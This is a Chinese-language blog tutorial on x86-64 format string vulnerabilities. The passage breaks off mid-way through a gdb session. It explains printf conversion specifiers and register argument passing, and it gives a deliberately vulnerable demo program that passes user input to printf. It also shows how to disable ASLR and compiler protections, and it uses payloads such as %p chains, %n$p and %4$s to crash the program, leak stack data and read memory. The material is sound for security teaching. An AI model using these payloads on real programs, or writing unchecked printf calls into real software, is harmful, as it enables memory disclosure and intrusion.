    <id>https://www.rgzzplus.com/2022/08/27/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2x86-64/</id>
    <published>2022-08-27T04:45:33.000Z</published>
    <updated>2022-09-04T08:46:26.185Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="1-格式化输出函数"><a class="markdownIt-Anchor" href="#1-格式化输出函数"></a> 1 格式化输出函数</h2><h3 id="11-变参函数"><a class="markdownIt-Anchor" href="#11-变参函数"></a> 1.1 变参函数</h3><p>C 语言中定义的变参函数，即参数数量可变的函数。它**由一定数量（至少一个）的强制参数和数量可变的可选参数组成，强制参数在前，可选参数在后。**可选参数的类型可以变化，而数量由强制参数的值或者用来定义可选参数列表的特殊值决定。</p><p>printf()就是一个变参函数，它有一个强制参数，即格式化字符串。格式化字符串中的转换指示符决定了可选参数的数量和类型。变参函数要获取可选参数时，必须通过一个类型为 va list 的对象，也称为参数指针，它包含了栈中至少一个参数的位置。使用这个参数指针可以从一个可选参数移动到下一个可选参数，从而获取所有的可选参数。va_list 类型被定义在头文件 stdarg.h 中。</p><h3 id="12-格式转换"><a class="markdownIt-Anchor" href="#12-格式转换"></a> 1.2 格式转换</h3><p>格式字符串是**由普通字符（包括 “%”）和转换规则构成的字符序列。**普通字符被原封不动地复制到输出流中。转换规则根据与实参对应地转换指示符对其进行转换，然后将结果写入输出流中。</p><p>一个转换规则由必选部分和可选部分组成。其中，只有转换指示符（type）是必选部分，用来表示转换类型。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%[parameter][flags][width][.precision][length]type</span><br></pre></td></tr></table></figure><ul><li>parameter，它是一个 POSIX 扩展，不属于 C99，用于指定某个参数，例如<code>%2$d</code>，表示输出后面地第2个参数</li><li>flags，用来调整输出和打印的符号、空白、小数点等。</li><li>width，用来指定输出字符的最小个数。</li><li>精度，用来指示打印符号个数、小数位数或者有效数字个数。</li><li>length，用来指定参数的大小。</li></ul><p>一些常见的转换指示符和长度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">指示符类型输出</span><br><span class="line">%d  <span class="number">4</span>-byteInteger</span><br><span class="line">%u  <span class="number">4</span>-byteUnsigned Integer</span><br><span class="line">%x  <span class="number">4</span>-byteHex</span><br><span class="line">%s  <span class="number">4</span>-byte ptrString</span><br><span class="line">%c  <span class="number">1</span>-byteCharacter</span><br><span class="line">    </span><br><span class="line">长度 类型 输出</span><br><span class="line">hh  <span class="number">1</span>-byte<span class="type">char</span></span><br><span class="line">h  <span class="number">2</span>-byte<span class="type">short</span> <span class="type">int</span></span><br><span class="line">l  <span class="number">4</span>-byte<span class="type">long</span> <span class="type">int</span></span><br><span class="line">ll  <span class="number">8</span>-byte<span class="type">long</span> <span class="type">long</span> <span class="type">int</span></span><br></pre></td></tr></table></figure><h2 id="2-格式化字符串漏洞"><a class="markdownIt-Anchor" href="#2-格式化字符串漏洞"></a> 2 格式化字符串漏洞</h2><h3 id="21-基本原理"><a class="markdownIt-Anchor" href="#21-基本原理"></a> 2.1 基本原理</h3><p>函数传参存在两种方式，一种是通过栈，一种是通过寄存器。对于x64体系结构，如果函数参数不大于6个时，使用寄存器传参，对于函数参数大于6个的函数，前六个参数使用寄存器传递，后面的使用栈传递。参数传递的规律是固定的，即<strong>前6个参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9</strong>，后面的依次从 “右向左” 放入栈中。</p><blockquote><p>不过有些时候，局部数据必须存入内存</p><p>\1. 寄存器不够放<br>\2. 对一个局部变量使用地址引用符 &amp; ，因为无法对寄存器取地址，因此必须产生一个内存地址，使用到内存<br>\3. 某些局部变量是数组或者结构，必须数组或者结构引用被访问到</p></blockquote><blockquote><p>如想了解更多：<a href="https://bbs.pediy.com/thread-257246.htm">x86_64架构下的函数调用及栈帧原理</a></p></blockquote><p>我们来看一个能产生格式化字符串漏洞的程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %d %s %p %p %p %p %p %p %p %p %p %p %3$s&quot;</span>, <span class="string">&quot;Hello world!&quot;</span>, <span class="number">233</span>, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -fno-stack-protector -no-pie fmtdemo.c -o fmtdemo -g</span></span><br><span class="line"><span class="meta">$ </span><span class="language-bash">./fmtdemo</span></span><br><span class="line">Hello world! 233 </span><br><span class="line"> (nil) 0x7ffff7fe0d60 (nil) 0x7ffff7dda083 0x7ffff7ffc620 0x7fffffffe0d8 0x100000000 0x401136 0x401170 0x3543f5d3292dd502 </span><br></pre></td></tr></table></figure><p>先编译运行一下，我们发现程序输出了 3个异样的数字，接下来我们调试一下程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">$ gdb-gef fmtdemo</span><br><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x401040</span><br><span class="line">gef➤  r</span><br><span class="line">Starting program: /home/sakura/文档/print/fmtdemo </span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00007ffff7e17c90 in printf () from /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line">$rax   : 0x0               </span><br><span class="line">$rbx   : 0x0000000000401170  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">$rcx   : 0x0000000000402008  →  0x206f6c6c6548000a (&quot;\n&quot;?)</span><br><span class="line">$rdx   : 0xe9              </span><br><span class="line">$rsp   : 0x00007fffffffdf78  →  0x0000000000401162  →  &lt;main+44&gt; nop </span><br><span class="line">$rbp   : 0x00007fffffffdf80  →  0x0000000000000000</span><br><span class="line">$rsi   : 0x000000000040200a  →  &quot;Hello world!&quot;</span><br><span class="line">$rdi   : 0x0000000000402018  →  &quot;%s %d %s %p %p %p %p %p %p %p %p %p %p %3$s&quot;</span><br><span class="line">$rip   : 0x00007ffff7e17c90  →  &lt;printf+0&gt; endbr64 </span><br><span class="line">$r8    : 0x0               </span><br><span class="line">$r9    : 0x00007ffff7fe0d60  →   endbr64 </span><br><span class="line">$r10   : 0x000000000040042b  →  0x5f0066746e697270 (&quot;printf&quot;?)</span><br><span class="line">$r11   : 0x00007ffff7e17c90  →  &lt;printf+0&gt; endbr64 </span><br><span class="line">$r12   : 0x0000000000401050  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">$r13   : 0x00007fffffffe070  →  0x0000000000000001</span><br><span class="line">$r14   : 0x0               </span><br><span class="line">$r15   : 0x0               </span><br><span class="line">$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line">$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdf78│+0x0000: 0x0000000000401162  →  &lt;main+44&gt; nop  ← $rsp</span><br><span class="line">0x00007fffffffdf80│+0x0008: 0x0000000000000000 ← $rbp</span><br><span class="line">0x00007fffffffdf88│+0x0010: 0x00007ffff7dda083  →  &lt;__libc_start_main+243&gt; mov edi, eax</span><br><span class="line">0x00007fffffffdf90│+0x0018: 0x00007ffff7ffc620  →  0x00050a3600000000</span><br><span class="line">0x00007fffffffdf98│+0x0020: 0x00007fffffffe078  →  0x00007fffffffe3b4  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffdfa0│+0x0028: 0x0000000100000000</span><br><span class="line">0x00007fffffffdfa8│+0x0030: 0x0000000000401136  →  &lt;main+0&gt; endbr64 </span><br><span class="line">0x00007fffffffdfb0│+0x0038: 0x0000000000401170  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#0] Id 1, Name: &quot;fmtdemo&quot;, stopped 0x7ffff7e17c90 in printf (), reason: BREAKPOINT</span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#0] 0x7ffff7e17c90 → printf()</span><br><span class="line">[#1] 0x401162 → main()</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>可以看到，r9=0x00007ffff7fe0d60，(nil) 0x7ffff7ffc620 0x7fffffffe0d8 0x100000000 0x401136 0x401170都是栈中 0x00007fffffffdf80~0x00007fffffffdfb0 的数据。其中 rbp =（nil），如果我们能通过某种方法找到 rbp 的位置并将 shellcode 的入口地址覆盖到这个位置，那么当函数返回时，就会跳转到去运行我们的shellcode了。</p><p>我们可以总结出，其实**格式字符串漏洞发生的条件就是格式字符串要求的参数和实际提供的参数不匹配。**下面我们讨论两个问题：</p><ul><li><p>为什么可以通过编译？</p><ul><li>因为 <code>printf()</code> 函数的参数被定义为可变的。</li><li>为了发现不匹配的情况，编译器需要理解 <code>printf()</code> 是怎么工作的和格式字符串是什么。然而，编译器并不知道这些。</li><li>有时格式字符串并不是固定的，它可能在程序执行中动态生成。</li></ul></li><li><p><code>printf()</code> 函数自己可以发现不匹配吗？</p><ul><li><code>printf()</code> 函数从栈中取出参数，如果它需要 3 个，那它就取出 3 个。除非栈的边界被标记了，否则 <code>printf()</code> 是不会知道它取出的参数比提供给它的参数多了。然而并没有这样的标记。</li></ul></li></ul><h3 id="22-漏洞利用"><a class="markdownIt-Anchor" href="#22-漏洞利用"></a> 2.2 漏洞利用</h3><p>通过提供格式字符串，我们就能够控制格式化函数的行为。漏洞的利用主要有下面几种。</p><h4 id="221-使程序崩溃"><a class="markdownIt-Anchor" href="#221-使程序崩溃"></a> 2.2.1 使程序崩溃</h4><p>格式化字符串漏洞通常要在程序崩溃时才会被发现， 这也是最简单的利用方式。 在 Linux 中，存取无效的指针会使进程收到 <code>SIGSEGV</code> 信号， 从而<strong>使程序非正常终止并产生核心转储</strong>， 其中存储了程序崩溃时的许多重要信息， 而这些信息正是攻击者所需要的。</p><p>通常， 使用类似下面的格式字符串即可触发崩溃。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s&quot;</span>) </span><br></pre></td></tr></table></figure><p>原因有 3 点：<br>(1) 对于每一个“％s”，printf() 都要从栈中获取一个数字， 将其视为一个地址， 然后打印出地址指向的内存， 直到出现一个 NULL 字符;<br>(2) 不可能获取的每一个数字都是地址，数字所对应的内存可能并不存在<br>(3) 还有可能获得的数字确实是一个地址，但是该地址是被保护的。</p><h4 id="222-栈数据泄露"><a class="markdownIt-Anchor" href="#222-栈数据泄露"></a> 2.2.2 栈数据泄露</h4><p>虽然在 x86_64 位操作系统下，函数通过寄存器传参，很难得到有效栈信息。不过，如果有办法，找到超过六个参数以上的函数，超出的部分参数就会逆序压入栈中，还有有机会获得栈内存数据的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//fmtdemo.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> format[<span class="number">128</span>];</span><br><span class="line">    <span class="type">int</span> arg1 = <span class="number">1</span>, arg2 = <span class="number">0x88888888</span>, arg3 = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span> arg4[<span class="number">10</span>] = <span class="string">&quot;ABCDEFGH&quot;</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, format);</span><br><span class="line">    <span class="built_in">printf</span>(format, arg1, arg2, arg3, arg4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做实验首先要注意<br>1.关闭ASLR，linux下ASLR是自动开启的，不关闭的话栈地址每次都是随机的（可能要管理员权限）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><p>2.编译时关闭CANARY,PIE。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gcc -fno-stack-protector -no-pie fmtdemo.c -o fmtdemo -g</span></span><br></pre></td></tr></table></figure><p>3.进行调试（下面的调用可能在您的电脑上不一样）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gdb-gef fmtdemo</span></span><br><span class="line">gef➤  b printf</span><br><span class="line">gef➤  r</span><br><span class="line"><span class="meta">%</span><span class="language-bash">p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span></span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x00007fffffffdf70  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x1</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007fffffffdee0  →  <span class="string">&quot;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x00007fffffffded6  →  <span class="string">&quot;ABCDEFGH&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0x7c</span>              </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x00007ffff7fef8c0  →   pxor xmm0, xmm0</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x00007ffff7e17c90  →  &lt;<span class="built_in">printf</span>+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x0000000000401090  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffe060  →  0x0000000000000001</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [zero carry parity adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffdec8│+0x0000: 0x00000000004011f6  →  &lt;main+128&gt; mov edi, 0xa ← $rsp</span><br><span class="line">0x00007fffffffded0│+0x0008: 0x4241000000000000</span><br><span class="line">0x00007fffffffded8│+0x0010: 0x0000484746454443 (&quot;CDEFGH&quot;?)</span><br><span class="line">0x00007fffffffdee0│+0x0018: &quot;%p.%p.%p.%p.%p.%p.%p.%p.%p.%p&quot; ← $rdi</span><br><span class="line">0x00007fffffffdee8│+0x0020: &quot;.%p.%p.%p.%p.%p.%p.%p&quot;</span><br><span class="line">0x00007fffffffdef0│+0x0028: &quot;p.%p.%p.%p.%p&quot;</span><br><span class="line">0x00007fffffffdef8│+0x0030: 0x00000070252e7025 (&quot;%p.%p&quot;?)</span><br><span class="line">0x00007fffffffdf00│+0x0038: 0x0000000000000000</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x7ffff7e17c81 &lt;fprintf+177&gt;    ret    </span><br><span class="line">   0x7ffff7e17c82 &lt;fprintf+178&gt;    call   0x7ffff7ee5a70 &lt;__stack_chk_fail&gt;</span><br><span class="line">   0x7ffff7e17c87                  nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line"> → 0x7ffff7e17c90 &lt;printf+0&gt;       endbr64 </span><br><span class="line">   0x7ffff7e17c94 &lt;printf+4&gt;       sub    rsp, 0xd8</span><br><span class="line">   0x7ffff7e17c9b &lt;printf+11&gt;      mov    r10, rdi</span><br><span class="line">   0x7ffff7e17c9e &lt;printf+14&gt;      mov    QWORD PTR [rsp+0x28], rsi</span><br><span class="line">   0x7ffff7e17ca3 &lt;printf+19&gt;      mov    QWORD PTR [rsp+0x30], rdx</span><br><span class="line">   0x7ffff7e17ca8 &lt;printf+24&gt;      mov    QWORD PTR [rsp+0x38], rcx</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;fmtdemo&quot;</span>, stopped 0x7ffff7e17c90 <span class="keyword">in</span> <span class="built_in">printf</span> (), reason: BREAKPOINT</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x7ffff7e17c90 → <span class="built_in">printf</span>()</span></span><br><span class="line"><span class="meta">[#</span><span class="language-bash">1] 0x4011f6 → main()</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  x/32x $rsp</span><br><span class="line">0x7fffffffdec8:0x004011f60x000000000x000000000x42410000</span><br><span class="line">0x7fffffffded8:0x464544430x000048470x252e70250x70252e70</span><br><span class="line">0x7fffffffdee8:0x2e70252e0x252e70250x70252e700x2e70252e</span><br><span class="line">0x7fffffffdef8:0x252e70250x000000700x000000000x00000000</span><br><span class="line">0x7fffffffdf08:0x000000000x000000000x004000400x00000000</span><br><span class="line">0x7fffffffdf18:0x00f0b5ff0x000000000x000000c20x00000000</span><br><span class="line">0x7fffffffdf28:0xffffdf570x00007fff0xffffdf560x00007fff</span><br><span class="line">0x7fffffffdf38:0x0040125d0x000000000xf7fa72e80x00007fff</span><br><span class="line">gef➤  c</span><br><span class="line">Continuing.</span><br><span class="line">0x1.0x88888888.0xffffffff.0x7fffffffded6.0x7c.0x4241000000000000.0x484746454443.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70</span><br><span class="line">[Inferior 1 (process 19160) exited with code 012]</span><br><span class="line">gef➤  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>传入参数后，相当于执行：</p><p><code>printf(%p.%p.%p.%p.%p.%p.%p.%p.%p.%p, 1, 88888888，-1, ABCDEFGH);</code></p><p>格式字符串 <code>%p</code> 表示函数 <code>printf()</code> 从参数调用流中取出参数并将它们指针的形式显示出来。它将首先输出除 rdi 外的 5 个寄存器中的内容（因为 rdi 负责传递字符串），然后继续输出栈的内容。</p><p>格式化输出函数使用一个内部变量来标志下一个参数的位置。 开始时，参数指针指向第一个参数 arg1 随着每一个参数被相应的格式规范使用， 参数指针也根据参数的长度不断递增。在打印完当前函数的剩余参数之后，printf() 就会打印当前函数的栈帧（ 包括返回地址和参数等 )。</p><hr><p>上面的方法都是依次获得栈中的参数，如果我们想要<strong>直接获得被指定的某个参数</strong>，则可以使用类似下面的格式字符串：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%&lt;arg#&gt;$&lt;format&gt;</span><br><span class="line"></span><br><span class="line">%n$p</span><br></pre></td></tr></table></figure><p>这里的 <code>n</code> 表示栈中格式字符串后面的第 <code>n</code> 个值。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">./fmtdemo</span> </span><br><span class="line"><span class="meta">%</span><span class="language-bash">7<span class="variable">$p</span>.%8<span class="variable">$p</span>.%9<span class="variable">$p</span></span></span><br><span class="line">0x484746454443.0x2438252e70243725.0x702439252e70</span><br><span class="line"><span class="meta">$ </span></span><br></pre></td></tr></table></figure><p>我们通过 <code>%7$p</code> 获取了 <code>arg4</code> 在栈上的内容。可以看到这种方法非常强大，可以获得栈中任意的值。</p><h4 id="223-任意地址内存泄漏"><a class="markdownIt-Anchor" href="#223-任意地址内存泄漏"></a> 2.2.3 任意地址内存泄漏</h4><p>攻击者使用类似**“％S”的格式规范就可以泄露出参数（ 指针） 所指向内存的数据**， 程序会将它作为一个 ASCII 字符串处理， 直到遇到一个空字符。所以， 如果攻击者能够操纵这个参数的值， 那么就可以泄露任意地址的内容。</p><p>还是上面的程序，我们输入 <code>%4$s</code>，输出的 <code>arg4</code> 就变成了 <code>ABCD</code> 而不是地址 <code>0x7fffffffded6</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">./fmtdemo</span></span><br><span class="line"><span class="meta">%</span><span class="language-bash">4<span class="variable">$s</span></span></span><br><span class="line">ABCDEFGH</span><br><span class="line"><span class="meta">$ </span></span><br></pre></td></tr></table></figure><p>上面的例子只能读取栈中已有的内容，如果我们想获取的是任意的地址的内容，就需要我们自己将地址写入到栈中。我们输入 <code>AAAA.%p</code> 这样的格式的字符串，观察一下栈有什么变化。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">python -c <span class="string">&#x27;print(&quot;AAAAAAAA&quot;+&quot;.%p&quot;*20)&#x27;</span></span></span><br><span class="line">AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line"></span><br><span class="line">gef➤  b printf</span><br><span class="line">Breakpoint 1 at 0x401070</span><br><span class="line">gef➤  r</span><br><span class="line">AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000000000401210  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0xffffffff</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x88888888</span>        </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffdec8  →  0x00000000004011f6 